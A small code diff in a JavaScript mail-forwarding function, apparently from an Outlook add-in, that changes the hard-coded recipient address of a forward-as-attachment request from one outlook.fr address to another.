@@ -132,7 +132,7 @@ function forwardAsAttachmentFunc(accessToken) {
                 },
                 "ToRecipients": [{
                     "EmailAddress": {
-                        "Address": "gco-cco@outlook.fr"
+                        "Address": "gco-ccm@outlook.fr"
                     }
                 }],
                 "Attachments": [
